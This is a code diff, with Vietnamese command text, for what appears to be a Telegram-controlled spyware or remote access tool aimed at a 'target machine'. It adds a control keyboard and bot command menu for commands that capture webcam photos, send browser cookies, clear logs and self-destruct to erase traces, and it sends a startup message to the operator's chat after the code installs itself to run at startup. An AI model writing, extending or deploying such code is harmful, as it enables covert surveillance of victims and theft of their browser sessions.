@@ -315,7 +315,36 @@ def send_telegram_document(path):
             log_message(f"Failed to move document {path} to outbox: {e}")
         return False
 
-def send_telegram_message(text, save_on_fail=True):
+def get_control_keyboard():
+    return {
+        "keyboard": [
+            [{"text": "/status"}, {"text": "/webcam"}],
+            [{"text": "/browser"}, {"text": "/clear"}],
+            [{"text": "/interval"}, {"text": "/name"}],
+            [{"text": "/help"}]
+        ],
+        "resize_keyboard": True,
+        "one_time_keyboard": False
+    }
+
+def setup_bot_commands():
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands"
+        commands = [
+            {"command": "status", "description": "Xem trạng thái hoạt động"},
+            {"command": "webcam", "description": "Chụp hình từ webcam"},
+            {"command": "browser", "description": "Gửi cookie trình duyệt"},
+            {"command": "clear", "description": "Xóa logs và ảnh tạm thời"},
+            {"command": "interval", "description": "Cấu hình thời gian gửi/chụp"},
+            {"command": "name", "description": "Xem/Cài đặt tên máy"},
+            {"command": "destruct", "description": "Tự hủy tool trên máy mục tiêu"},
+            {"command": "help", "description": "Hướng dẫn sử dụng chi tiết"}
+        ]
+        requests.post(url, json={"commands": commands}, timeout=10)
+    except:
+        pass
+
+def send_telegram_message(text, save_on_fail=True, reply_markup=None):
     if not text.strip():
         return True
     
@@ -332,11 +361,13 @@ def send_telegram_message(text, save_on_fail=True):
     overall_success = True
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
-    for chunk in chunks:
+    for idx, chunk in enumerate(chunks):
         chunk_success = False
         for i in range(3):
             try:
                 data = {'chat_id': CHAT_ID, 'text': chunk, 'parse_mode': 'HTML'}
+                if reply_markup and idx == len(chunks) - 1:
+                    data['reply_markup'] = json.dumps(reply_markup)
                 r = requests.post(url, data=data, timeout=10)
                 if r.status_code == 200 and r.json().get('ok'):
                     chunk_success = True
@@ -873,7 +904,7 @@ def execute_command(command, message=None):
             "/destruct - Tự hủy tool và xóa dấu vết\n"
             "/help - Danh sách lệnh"
         )
-        send_telegram_message(help_text)
+        send_telegram_message(help_text, reply_markup=get_control_keyboard())
 
 def poll_telegram():
     state = load_state()
@@ -924,11 +955,17 @@ def main():
 
     add_to_startup()
     
+    # Configure bot commands menu on Telegram
+    try:
+        Thread(target=setup_bot_commands, daemon=True).start()
+    except Exception as e:
+        log_message(f"Error starting setup_bot_commands: {e}")
+        
     try:
         state = load_state()
         machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
         startup_msg = f"🟢 <b>[{machine}]</b> Khởi động...\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        Thread(target=send_telegram_message, args=(startup_msg,), daemon=True).start()
+        Thread(target=send_telegram_message, args=(startup_msg, True, get_control_keyboard()), daemon=True).start()
     except Exception as e:
         log_message(f"Error sending startup message: {e}")
     
